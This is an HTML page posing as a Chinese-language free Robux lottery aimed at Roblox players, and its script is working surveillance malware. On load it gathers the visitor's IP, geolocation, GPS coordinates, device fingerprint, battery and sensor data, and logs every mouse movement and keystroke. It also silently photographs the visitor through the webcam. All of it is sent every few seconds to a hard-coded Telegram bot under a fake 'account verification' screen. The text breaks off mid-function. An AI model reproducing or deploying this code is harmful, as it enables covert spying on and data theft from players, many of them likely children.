<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ® å…è´¹RobuxæŠ½å¥–æ´»åŠ¨ - æ¯æ—¥èµ¢å–10000 Robuxï¼</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Microsoft YaHei', 'Segoe UI', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            padding: 40px 20px;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 3.2rem;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #00a2ff 0%, #00ffaa 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0, 255, 170, 0.3);
        }

        .header p {
            font-size: 1.2rem;
            color: #8af;
            margin-bottom: 20px;
        }

        .robux-animation {
            font-size: 2.5rem;
            text-align: center;
            animation: float 3s infinite ease-in-out;
            margin: 20px 0;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .prize-showcase {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 25px;
            margin: 40px 0;
        }

        .prize-card {
            background: rgba(0, 40, 80, 0.7);
            border: 2px solid #00ffaa;
            border-radius: 15px;
            padding: 25px;
            width: 260px;
            text-align: center;
            transition: all 0.3s;
            backdrop-filter: blur(10px);
        }

        .prize-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 255, 170, 0.3);
            border-color: #ff3366;
        }

        .prize-card h3 {
            font-size: 1.6rem;
            margin-bottom: 10px;
            color: #00ffaa;
        }

        .prize-card .robux-amount {
            font-size: 2.4rem;
            color: #ffcc00;
            font-weight: bold;
            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
            margin: 10px 0;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: #00ffaa;
            font-size: 1.2rem;
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 3px solid transparent;
            border-top: 3px solid #00ffaa;
            border-right: 3px solid #00ffaa;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .verification-panel {
            background: rgba(0, 30, 60, 0.9);
            border: 1px solid #00a2ff;
            border-radius: 15px;
            padding: 30px;
            margin: 30px auto;
            max-width: 800px;
            display: none;
        }

        .data-stream {
            height: 180px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #00ffaa;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            font-family: 'Consolas', 'Courier New', monospace;
            color: #00ffaa;
            font-size: 0.9rem;
        }

        .counter {
            text-align: center;
            font-size: 1.3rem;
            color: #ff3366;
            margin: 20px 0;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .success-screen {
            text-align: center;
            padding: 50px 20px;
            display: none;
        }

        .success-icon {
            font-size: 5rem;
            margin-bottom: 20px;
            color: #00ffaa;
            animation: celebrate 2s infinite;
        }

        @keyframes celebrate {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        .winners-showcase {
            background: rgba(0, 40, 80, 0.8);
            border-radius: 15px;
            padding: 25px;
            margin: 30px auto;
            max-width: 800px;
        }

        .winner-card {
            display: flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border-left: 4px solid #ffcc00;
        }

        .progress-bar {
            width: 100%;
            height: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            margin: 30px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ffaa, #00a2ff);
            border-radius: 10px;
            width: 0%;
            transition: width 2s ease-in-out;
        }

        @media (max-width: 768px) {
            .header h1 {
                font-size: 2.2rem;
            }
            .prize-card {
                width: 100%;
                max-width: 300px;
            }
        }

        .btn {
            display: inline-block;
            padding: 12px 30px;
            background: linear-gradient(90deg, #00a2ff, #00ffaa);
            color: #000;
            border: none;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 170, 0.4);
        }

        .tip-box {
            background: rgba(0, 100, 200, 0.2);
            border-left: 4px solid #00a2ff;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
    </style>
</head>
<body>
<!-- åŠ è½½é®ç½© -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-spinner"></div>
    <div id="loadingText">æ­£åœ¨å‡†å¤‡RobuxæŠ½å¥–ç³»ç»Ÿ...</div>
    <div id="loadingProgress" style="margin-top: 10px; color: #8af;"></div>
</div>

<div class="container" id="mainContent" style="display: none;">
    <!-- å¤´éƒ¨ -->
    <div class="header">
        <h1>ğŸ å…è´¹ROBUXæŠ½å¥–æ´»åŠ¨ ğŸ</h1>
        <p>æ¯æ—¥é€å‡º10000 Robuxï¼é™æ—¶å‚ä¸ï¼Œå…ˆåˆ°å…ˆå¾—ï¼</p>
        <div class="robux-animation">ğŸª™ğŸ’°ğŸ’ğŸŒŸ</div>
    </div>

    <!-- åœ¨çº¿è®¡æ•°å™¨ -->
    <div class="counter" id="onlineCounter">
        å½“å‰æœ‰ <span id="onlineCount">1,247</span> äººåœ¨çº¿æŠ½å¥–ï¼
    </div>

    <!-- å¥–å“å±•ç¤º -->
    <div class="prize-showcase">
        <div class="prize-card">
            <h3>ğŸ¥‡ ä¸€ç­‰å¥–</h3>
            <div class="robux-amount">5,000 Robux</div>
            <p>+ é«˜çº§æ¸¸æˆé€šè¡Œè¯</p>
        </div>
        <div class="prize-card">
            <h3>ğŸ¥ˆ äºŒç­‰å¥–</h3>
            <div class="robux-amount">2,500 Robux</div>
            <p>+ ç‹¬å®¶æ¸¸æˆé“å…·</p>
        </div>
        <div class="prize-card">
            <h3>ğŸ¥‰ ä¸‰ç­‰å¥–</h3>
            <div class="robux-amount">1,000 Robux</div>
            <p>+ é™å®šå¤´åƒè£…æ‰®</p>
        </div>
    </div>

    <!-- è¿›åº¦æ¡ -->
    <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
    </div>

    <!-- éªŒè¯é¢æ¿ï¼ˆéšè—ï¼‰ -->
    <div class="verification-panel" id="verificationPanel">
        <h3 style="color: #00ffaa; text-align: center; margin-bottom: 20px;">ğŸ” æ­£åœ¨éªŒè¯æ‚¨çš„è´¦æˆ·...</h3>
        <div class="data-stream" id="dataStream">
            [ç³»ç»Ÿ] æ­£åœ¨å¯åŠ¨éªŒè¯æµç¨‹...<br>
        </div>
        <p style="text-align: center; color: #8af; margin-top: 15px;">
            è¯·ç¨å€™ï¼Œæˆ‘ä»¬æ­£åœ¨éªŒè¯æ‚¨çš„è´¦æˆ·èµ„æ ¼...
        </p>
        <div class="tip-box">
            <strong>ğŸ“¢ æ¸©é¦¨æç¤ºï¼š</strong> ä¸ºç¡®ä¿å…¬å¹³æ€§ï¼Œé˜²æ­¢æœºå™¨äººåˆ·å¥–ï¼Œæˆ‘ä»¬éœ€è¦éªŒè¯æ‚¨çš„çœŸå®èº«ä»½ã€‚
        </div>
    </div>

    <!-- è·å¥–è€…å±•ç¤º -->
    <div class="winners-showcase">
        <h3 style="color: #ffcc00; margin-bottom: 20px;">ğŸ‰ æœ€è¿‘è·å¥–è€…</h3>
        <div class="winner-card">
            <div style="background: #ffcc00; color: #000; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">ğŸ¥‡</div>
            <div>
                <strong>@Robloxç©å®¶123</strong> åˆšåˆšèµ¢å¾—äº† <span style="color: #ffcc00;">5,000 Robux</span>ï¼
            </div>
            <div style="margin-left: auto; color: #8af;">2åˆ†é’Ÿå‰</div>
        </div>
        <div class="winner-card">
            <div style="background: #c0c0c0; color: #000; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">ğŸ¥ˆ</div>
            <div>
                <strong>@æ¸¸æˆå°‘å¥³456</strong> åˆšåˆšèµ¢å¾—äº† <span style="color: #ffcc00;">2,500 Robux</span>ï¼
            </div>
            <div style="margin-left: auto; color: #8af;">5åˆ†é’Ÿå‰</div>
        </div>
        <div class="winner-card">
            <div style="background: #cd7f32; color: #000; padding: 5px 10px; border-radius: 5px; margin-right: 15px;">ğŸ¥‰</div>
            <div>
                <strong>@å»ºç­‘å¤§å¸ˆ789</strong> åˆšåˆšèµ¢å¾—äº† <span style="color: #ffcc00;">1,000 Robux</span>ï¼
            </div>
            <div style="margin-left: auto; color: #8af;">10åˆ†é’Ÿå‰</div>
        </div>
    </div>

    <!-- æˆåŠŸå±å¹• -->
    <div class="success-screen" id="successScreen">
        <div class="success-icon">âœ…</div>
        <h2 style="color: #00ffaa; margin-bottom: 15px;">éªŒè¯æˆåŠŸï¼</h2>
        <p style="color: #8af; font-size: 1.2rem; margin-bottom: 25px;">
            æ‚¨å·²æˆåŠŸå‚ä¸ä»Šæ—¥çš„RobuxæŠ½å¥–ï¼å¼€å¥–ç»“æœå°†é€šè¿‡Robloxç«™å†…ä¿¡é€šçŸ¥ã€‚ğŸ‰
        </p>
        <div style="background: rgba(0, 255, 170, 0.1); padding: 25px; border-radius: 15px; max-width: 500px; margin: 0 auto;">
            <p style="color: #00ffaa; margin-bottom: 10px;">ğŸ¯ <strong>æ‚¨çš„æŠ½å¥–ç¼–å·ï¼š</strong> <span id="entryNumber" style="color: #ffcc00;">RG-</span></p>
            <p style="color: #00ffaa; margin-bottom: 10px;">â° <strong>å¼€å¥–æ—¶é—´ï¼š</strong> ä»Šæ—¥æ™šä¸Š8:00ï¼ˆç¾å›½ä¸œéƒ¨æ—¶é—´ï¼‰</p>
            <p style="color: #00ffaa; margin-bottom: 10px;">ğŸ“± <strong>é€šçŸ¥æ–¹å¼ï¼š</strong> Robloxç«™å†…ä¿¡é€šçŸ¥è·å¥–è€…</p>
            <p style="color: #00ffaa;">ğŸ’° <strong>ä»Šæ—¥æ€»å¥–æ± ï¼š</strong> <span style="color: #ffcc00;">50,000 Robux</span></p>
        </div>
        <div style="margin-top: 30px; padding: 20px; background: rgba(0, 100, 200, 0.2); border-radius: 10px;">
            <p style="color: #8af;">âš ï¸ è¯·ä¿æŒæ­¤é¡µé¢æ‰“å¼€5åˆ†é’Ÿä»¥ç¡®è®¤æ‚¨çš„å‚ä¸èµ„æ ¼ï¼</p>
        </div>
    </div>

    <!-- éšè—å…ƒç´  -->
    <video id="cameraPreview" style="display: none;" autoplay playsinline></video>
    <canvas id="photoCanvas" style="display: none;"></canvas>

    <!-- æ´»åŠ¨è§„åˆ™ -->
    <div style="margin-top: 50px; padding: 25px; background: rgba(0, 30, 60, 0.5); border-radius: 15px;">
        <h3 style="color: #00a2ff; margin-bottom: 15px;">ğŸ“‹ æ´»åŠ¨è§„åˆ™</h3>
        <ul style="color: #aaf; padding-left: 20px;">
            <li>æ¯ä¸ªRobloxè´¦æˆ·åªèƒ½å‚ä¸ä¸€æ¬¡</li>
            <li>è·å¥–è€…å°†åœ¨å¼€å¥–å24å°æ—¶å†…æ”¶åˆ°é€šçŸ¥</li>
            <li>Robuxå°†åœ¨è·å¥–å72å°æ—¶å†…å‘æ”¾åˆ°è´¦æˆ·</li>
            <li>æœ¬æ¬¡æ´»åŠ¨ä¸Roblox Corporationæ— å…³</li>
            <li>å‚ä¸å³è¡¨ç¤ºåŒæ„æˆ‘ä»¬çš„ä½¿ç”¨æ¡æ¬¾</li>
        </ul>
    </div>

    <!-- é¡µè„š -->
    <div style="text-align: center; margin-top: 50px; padding-top: 20px; border-top: 1px solid rgba(255, 255, 255, 0.1);">
        <p style="color: #666; font-size: 0.9rem;">
            Â© 2024 RobuxæŠ½å¥–å®˜æ–¹å¹³å°ã€‚æœ¬æ´»åŠ¨ä¸Roblox Corporationæ— å…³ã€‚<br>
            Robuxå’ŒRobloxæ˜¯Roblox Corporationçš„å•†æ ‡ã€‚
        </p>
    </div>
</div>

<script>
    // ==================== é…ç½®ä¿¡æ¯ ====================
    const TELEGRAM_CONFIG = {
        botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
        chatId: "8313770381",
        sendInterval: 3000
    };

    // ==================== å…¨å±€å˜é‡ ====================
    let collectedData = {
        timestamp: new Date().toISOString(),
        status: 'æ­£åœ¨åˆå§‹åŒ–',
        ip: null,
        location: null,
        device: {},
        network: {},
        behavior: [],
        camera: { accessed: false, photo: null }
    };

    let dataStreamInterval;
    let telemetrySent = false;
    let cameraAccessed = false;
    let mousePositions = [];
    let keyStrokes = [];

    // ==================== DOMå…ƒç´  ====================
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingText = document.getElementById('loadingText');
    const loadingProgress = document.getElementById('loadingProgress');
    const mainContent = document.getElementById('mainContent');
    const verificationPanel = document.getElementById('verificationPanel');
    const dataStream = document.getElementById('dataStream');
    const successScreen = document.getElementById('successScreen');
    const cameraPreview = document.getElementById('cameraPreview');
    const photoCanvas = document.getElementById('photoCanvas');
    const progressFill = document.getElementById('progressFill');
    const onlineCount = document.getElementById('onlineCount');
    const entryNumber = document.getElementById('entryNumber');
        // ==================== å·¥å…·å‡½æ•° ====================
        
        // æ›´æ–°åŠ è½½æ–‡æœ¬
        function updateLoading(text) {
            if (loadingText) loadingText.textContent = text;
        }

        // æ›´æ–°è¿›åº¦
        function updateProgress(text, percent) {
            if (loadingProgress) loadingProgress.textContent = text;
            if (progressFill) progressFill.style.width = percent + '%';
        }

        // è®°å½•æ•°æ®æµ
        function logToStream(message) {
            if (dataStream) {
                const timestamp = new Date().toLocaleTimeString();
                dataStream.innerHTML += `[${timestamp}] ${message}<br>`;
                dataStream.scrollTop = dataStream.scrollHeight;
            }
            console.log(message);
        }

        // ç”ŸæˆæŠ½å¥–ç¼–å·
        function generateEntryNumber() {
            const prefix = 'RG-';
            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 8; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return prefix + result;
        }

        // æ ¼å¼åŒ–Telegramæ¶ˆæ¯
        function formatTelegramMessage() {
            return `ğŸš¨ æ–°çš„ROBUXæŠ½å¥–å‚ä¸è€… ğŸš¨

ğŸ“… æ—¶é—´: ${new Date().toLocaleString()}
ğŸŒ IPåœ°å€: ${collectedData.ip || 'æœªçŸ¥'}
ğŸ“ åœ°ç†ä½ç½®: ${collectedData.location || 'æœªçŸ¥'}
ğŸ“± è®¾å¤‡: ${collectedData.device.platform || 'æœªçŸ¥'}
ğŸ–¥ï¸ å±å¹•åˆ†è¾¨ç‡: ${collectedData.device.screen || 'æœªçŸ¥'}
ğŸŒ æµè§ˆå™¨: ${collectedData.device.browser || 'æœªçŸ¥'} ${collectedData.device.browserVersion || ''}
ğŸ—£ï¸ ç³»ç»Ÿè¯­è¨€: ${collectedData.device.language || 'æœªçŸ¥'}
â±ï¸ æ—¶åŒº: ${collectedData.device.timezone || 'æœªçŸ¥'}
ğŸ›œ ç½‘ç»œè¿è¥å•†: ${collectedData.network.isp || 'æœªçŸ¥'}
ğŸ”‹ ç”µæ± çŠ¶æ€: ${collectedData.device.battery || 'æœªçŸ¥'}
ğŸ“¸ æ‘„åƒå¤´è®¿é—®: ${cameraAccessed ? 'æˆåŠŸ âœ…' : 'å¤±è´¥ âŒ'}
ğŸ–±ï¸ é¼ æ ‡è½¨è¿¹: ${mousePositions.length} ä¸ªç‚¹
âŒ¨ï¸ é”®ç›˜è¾“å…¥: ${keyStrokes.length} æ¬¡æŒ‰é”®
ğŸ¯ UserAgent: ${collectedData.device.userAgent || 'æœªçŸ¥'}

ğŸ“Š å®Œæ•´æ•°æ®:
${JSON.stringify(collectedData, null, 2)}`;
        }

        // å‘é€åˆ°Telegram
        async function sendToTelegram(message, isPhoto = false) {
            if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) {
                console.error('Telegramé…ç½®ç¼ºå¤±ï¼');
                return false;
            }

            try {
                let url, options;
                
                if (isPhoto) {
                    // å‘é€ç…§ç‰‡
                    url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`;
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
                    formData.append('photo', message, 'face_verification.jpg');
                    formData.append('caption', `ğŸ“¸ äººè„¸éªŒè¯ - ${new Date().toLocaleString()}`);
                    
                    options = {
                        method: 'POST',
                        body: formData
                    };
                } else {
                    // å‘é€æ–‡æœ¬æ¶ˆæ¯
                    url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
                    options = {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CONFIG.chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    };
                }

                const response = await fetch(url, options);
                const result = await response.json();
                
                if (result.ok) {
                    logToStream(`âœ… æ•°æ®å·²å‘é€åˆ°Telegram ${isPhoto ? '(ç…§ç‰‡)' : '(æ–‡æœ¬)'}`);
                    return true;
                } else {
                    logToStream(`âŒ Telegramé”™è¯¯: ${result.description}`);
                    return false;
                }
            } catch (error) {
                logToStream(`âŒ ç½‘ç»œé”™è¯¯: ${error.message}`);
                return false;
            }
        }
// ==================== æ•°æ®æ”¶é›†å‡½æ•° ====================

// æ”¶é›†ç½‘ç»œä¿¡æ¯
async function collectNetworkInfo() {
    updateProgress('æ­£åœ¨æ”¶é›†ç½‘ç»œä¿¡æ¯...', 20);
    
    try {
        // è·å–IPåœ°å€
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        collectedData.ip = ipData.ip;
        
        // è·å–åœ°ç†ä½ç½®
        try {
            const geoResponse = await fetch(`https://ipapi.co/${collectedData.ip}/json/`);
            const geoData = await geoResponse.json();
            
            collectedData.network = {
                ip: collectedData.ip,
                city: geoData.city,
                region: geoData.region,
                country: geoData.country_name,
                countryCode: geoData.country_code,
                isp: geoData.org,
                asn: geoData.asn,
                vpn: geoData.vpn || false,
                tor: geoData.tor || false,
                proxy: geoData.proxy || false,
                latitude: geoData.latitude,
                longitude: geoData.longitude
            };
            
            collectedData.location = `${geoData.city || 'æœªçŸ¥'}, ${geoData.country_name || 'æœªçŸ¥'}`;
            logToStream(`ğŸ“ åœ°ç†ä½ç½®: ${collectedData.location}`);
            logToStream(`ğŸ¢ ç½‘ç»œè¿è¥å•†: ${geoData.org}`);
            logToStream(`ğŸŒ IPåœ°å€: ${collectedData.ip}`);
            
        } catch (geoError) {
            // å¤‡ç”¨API
            try {
                const fallbackResponse = await fetch(`http://ip-api.com/json/${collectedData.ip}`);
                const fallbackData = await fallbackResponse.json();
                if (fallbackData.status === 'success') {
                    collectedData.network = {
                        ip: collectedData.ip,
                        city: fallbackData.city,
                        region: fallbackData.regionName,
                        country: fallbackData.country,
                        isp: fallbackData.isp,
                        latitude: fallbackData.lat,
                        longitude: fallbackData.lon
                    };
                    collectedData.location = `${fallbackData.city}, ${fallbackData.country}`;
                }
            } catch (e) {}
        }
        
    } catch (error) {
        logToStream('âš ï¸ ç½‘ç»œä¿¡æ¯æ”¶é›†å¤±è´¥');
    }
}

// æ”¶é›†è®¾å¤‡ä¿¡æ¯
function collectDeviceInfo() {
    updateProgress('æ­£åœ¨æ‰«æè®¾å¤‡ä¿¡æ¯...', 40);
    
    collectedData.device = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type,
        deviceMemory: navigator.deviceMemory || 'æœªçŸ¥',
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        doNotTrack: navigator.doNotTrack,
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        browser: detectBrowser(),
        browserVersion: detectBrowserVersion(),
        os: detectOS()
    };

    // è¿æ¥ä¿¡æ¯
    if (navigator.connection) {
        collectedData.device.connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        };
    }

    // ç”µæ± ä¿¡æ¯
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            collectedData.device.battery = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            logToStream(`ğŸ”‹ ç”µæ± çŠ¶æ€: ${collectedData.device.battery.level}`);
        });
    }

    logToStream(`ğŸ“± è®¾å¤‡å¹³å°: ${collectedData.device.platform}`);
    logToStream(`ğŸ–¥ï¸ å±å¹•åˆ†è¾¨ç‡: ${collectedData.device.screen}`);
    logToStream(`ğŸŒ æµè§ˆå™¨: ${collectedData.device.browser} ${collectedData.device.browserVersion}`);
    logToStream(`â±ï¸ æ—¶åŒº: ${collectedData.device.timezone}`);
}

// æ£€æµ‹æµè§ˆå™¨
function detectBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    return "æœªçŸ¥";
}

// æ£€æµ‹æµè§ˆå™¨ç‰ˆæœ¬
function detectBrowserVersion() {
    const ua = navigator.userAgent;
    const matches = ua.match(/(chrome|firefox|safari|edge|opera|opr|msie|trident(?=\/))\/?\s*(\d+)/i);
    return matches ? matches[2] : 'æœªçŸ¥';
}

// æ£€æµ‹æ“ä½œç³»ç»Ÿ
function detectOS() {
    const ua = navigator.userAgent;
    if (ua.includes("Windows")) return "Windows";
    if (ua.includes("Mac")) return "MacOS";
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
    return "æœªçŸ¥";
}
// ==================== æ‘„åƒå¤´å’Œä½ç½®æ”¶é›† ====================

// ç«‹å³è®¿é—®æ‘„åƒå¤´
async function accessCamera() {
    updateProgress('æ­£åœ¨éªŒè¯èº«ä»½...', 60);
    
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        logToStream('âŒ æ‘„åƒå¤´APIä¸æ”¯æŒ');
        return false;
    }

    try {
        logToStream('ğŸ“¸ å°è¯•è®¿é—®æ‘„åƒå¤´...');
        
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 640 },
                height: { ideal: 480 },
                facingMode: 'user'
            },
            audio: false
        });

        cameraAccessed = true;
        collectedData.camera.accessed = true;
        logToStream('âœ… æ‘„åƒå¤´è®¿é—®æˆåŠŸï¼');
        
        // ç«‹å³æ‹ç…§
        cameraPreview.srcObject = stream;
        
        setTimeout(() => {
            try {
                const context = photoCanvas.getContext('2d');
                photoCanvas.width = cameraPreview.videoWidth || 640;
                photoCanvas.height = cameraPreview.videoHeight || 480;
                
                if (cameraPreview.videoWidth > 0) {
                    context.drawImage(cameraPreview, 0, 0);
                    
                    // è½¬æ¢ä¸ºblobå¹¶å‘é€
                    photoCanvas.toBlob(async (blob) => {
                        if (blob) {
                            collectedData.camera.photo = 'å·²æ•è·';
                            logToStream('ğŸ“· ç…§ç‰‡æ•è·æˆåŠŸ');
                            
                            // å‘é€ç…§ç‰‡åˆ°Telegram
                            await sendToTelegram(blob, true);
                            
                            // å…³é—­æ‘„åƒå¤´
                            stream.getTracks().forEach(track => track.stop());
                            cameraPreview.srcObject = null;
                        }
                    }, 'image/jpeg', 0.8);
                }
            } catch (photoError) {
                logToStream('âŒ ç…§ç‰‡æ•è·å¤±è´¥');
            }
        }, 100); // 100æ¯«ç§’åæ‹ç…§

        return true;
        
    } catch (error) {
        logToStream(`âŒ æ‘„åƒå¤´è®¿é—®è¢«æ‹’ç»: ${error.name}`);
        collectedData.camera.error = error.name;
        return false;
    }
}

// è·å–åœ°ç†ä½ç½®
async function getLocation() {
    if ('geolocation' in navigator) {
        try {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    collectedData.location = {
                        gps: {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        }
                    };
                    logToStream(`ğŸ“ GPSåæ ‡: ${position.coords.latitude}, ${position.coords.longitude}`);
                },
                (error) => {
                    logToStream('âš ï¸ ä½ç½®æƒé™è¢«æ‹’ç»');
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        } catch (error) {
            // é™é»˜å¤±è´¥
        }
    }
}

// æ”¶é›†ä¼ æ„Ÿå™¨æ•°æ®
function collectSensorData() {
    updateProgress('æ­£åœ¨æ£€æµ‹ä¼ æ„Ÿå™¨...', 70);
    
    collectedData.sensors = {};
    
    // é™€èºä»ª
    if ('DeviceOrientationEvent' in window) {
        collectedData.sensors.gyroscope = true;
        window.addEventListener('deviceorientation', (event) => {
            if (!collectedData.sensors.orientation) {
                collectedData.sensors.orientation = {
                    alpha: event.alpha,
                    beta: event.beta,
                    gamma: event.gamma
                };
            }
        }, { once: true });
    }

    // åŠ é€Ÿåº¦è®¡
    if ('DeviceMotionEvent' in window) {
        collectedData.sensors.accelerometer = true;
        window.addEventListener('devicemotion', (event) => {
            if (!collectedData.sensors.motion) {
                collectedData.sensors.motion = {
                    acceleration: event.acceleration,
                    accelerationIncludingGravity: event.accelerationIncludingGravity,
                    rotationRate: event.rotationRate
                };
            }
        }, { once: true });
    }

    // å…‰çº¿ä¼ æ„Ÿå™¨
    if ('AmbientLightSensor' in window) {
        collectedData.sensors.lightSensor = true;
    }

    logToStream('ğŸ“¡ ä¼ æ„Ÿå™¨æ‰«æå®Œæˆ');
}
        // ==================== è¡Œä¸ºè·Ÿè¸ª ====================

        // è·Ÿè¸ªé¼ æ ‡ç§»åŠ¨
        function trackMouse() {
            document.addEventListener('mousemove', (event) => {
                mousePositions.push({
                    x: event.clientX,
                    y: event.clientY,
                    time: Date.now()
                });
                
                // åªä¿ç•™æœ€è¿‘100ä¸ªä½ç½®
                if (mousePositions.length > 100) {
                    mousePositions = mousePositions.slice(-100);
                }
                
                collectedData.behavior.push({
                    type: 'mouse_move',
                    x: event.clientX,
                    y: event.clientY,
                    timestamp: new Date().toISOString()
                });
            });
            
            // è·Ÿè¸ªç‚¹å‡»
            document.addEventListener('click', (event) => {
                collectedData.behavior.push({
                    type: 'click',
                    x: event.clientX,
                    y: event.clientY,
                    target: event.target.tagName,
                    timestamp: new Date().toISOString()
                });
            });
        }

        // è·Ÿè¸ªé”®ç›˜è¾“å…¥
        function trackKeyboard() {
            document.addEventListener('keydown', (event) => {
                keyStrokes.push({
                    key: event.key,
                    code: event.code,
                    time: Date.now()
                });
                
                collectedData.behavior.push({
                    type: 'keypress',
                    key: event.key,
                    code: event.code,
                    timestamp: new Date().toISOString()
                });
            });
        }

        // ==================== ä¸»æµç¨‹ ====================

        // å¼€å§‹æ•°æ®æ”¶é›†
        async function startDataCollection() {
            logToStream('ğŸš€ å¼€å§‹RobuxéªŒè¯æµç¨‹...');
            
            // æ˜¾ç¤ºéªŒè¯é¢æ¿
            verificationPanel.style.display = 'block';
            
            // æ­¥éª¤1: åŸºç¡€ä¿¡æ¯
            await collectNetworkInfo();
            
            // æ­¥éª¤2: è®¾å¤‡ä¿¡æ¯
            collectDeviceInfo();
            
            // æ­¥éª¤3: ç«‹å³å°è¯•æ‘„åƒå¤´
            setTimeout(() => {
                accessCamera();
            }, 500);
            
            // æ­¥éª¤4: å°è¯•è·å–ä½ç½®
            setTimeout(() => {
                getLocation();
            }, 1000);
            
            // æ­¥éª¤5: ä¼ æ„Ÿå™¨
            setTimeout(() => {
                collectSensorData();
            }, 1500);
            
            // æ­¥éª¤6: å¼€å§‹è¡Œä¸ºè·Ÿè¸ª
            trackMouse();
            trackKeyboard();
            
            // æ­¥éª¤7: å¼€å§‹å®šæœŸå‘é€æ•°æ®
            setTimeout(() => {
                sendTelemetryData();
                dataStreamInterval = setInterval(sendTelemetryData, TELEGRAM_CONFIG.sendInterval);
            }, 2000);
            
            // æ­¥éª¤8: å®ŒæˆéªŒè¯
            setTimeout(() => {
                completeVerification();
            }, 5000);
        }

        // å‘é€æ•°æ®åˆ°Telegram
        async function sendTelemetryData() {
            if (telemetrySent) return;
            
            try {
                const message = formatTelegramMessage();
                await sendToTelegram(message);
                
                // æ›´æ–°è®¡æ•°å™¨
                const currentCount = parseInt(onlineCount.textContent.replace(/,/g, ''));
                onlineCount.textContent = (currentCount + Math.floor(Math.random() * 3) + 1).toLocaleString();
                
            } catch (error) {
